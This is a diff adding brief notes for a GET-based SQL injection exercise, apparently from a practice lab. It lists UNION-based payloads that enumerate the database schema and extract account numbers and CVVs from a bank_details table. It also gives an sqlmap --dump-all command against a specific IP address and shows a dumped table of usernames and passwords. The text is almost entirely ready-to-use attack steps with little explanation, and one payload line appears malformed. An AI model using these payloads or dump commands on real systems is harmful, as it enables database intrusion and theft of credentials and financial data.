@@ -1,0 +1,29 @@
+-> GET Based SQL Injection in URL Variant 2
+
+Query:
+
+Hit and Trial: ?category=1 username, username, username, username from users
+Orderby: ?category=1 ORDER BY 5
+Information Schema Exploit:
+	Database Name- ?category=1 UNION SELECT database(), database(), database(), database()
+	Table Row Name- ?category=1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema="SQL_Injection_V4"
+	Table Column Name- ?category=1 UNION  SELECT column_name FROM information_schema.columns WHERE table_schema="SQL_Injection_V4" AND table_name="bank_details"
+	Table Data- ?category=1 UNION SELECT acc_number, cvv FROM bank_details
+
+SQLMAP: http://3.6.87.128/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username, password, username, password from users
+
+To fetch table name: sqlmap -u "http://3.6.87.128/SQL-Injection/GET-Based-SQL-Injection" -p category --dump-all
+
+Result:
+Database: SQL_Injection_V4
+Table: users
+[5 entries]
++----+------------+-----------+
+| id | password   | username  |
++----+------------+-----------+
+| 1  | password   | username  |
+| 2  | keypad     | qwerty123 |
+| 3  | login      | 123456789 |
+| 4  | joker      | batman    |
+| 5  | kryptonite | superman  |
++----+------------+-----------+
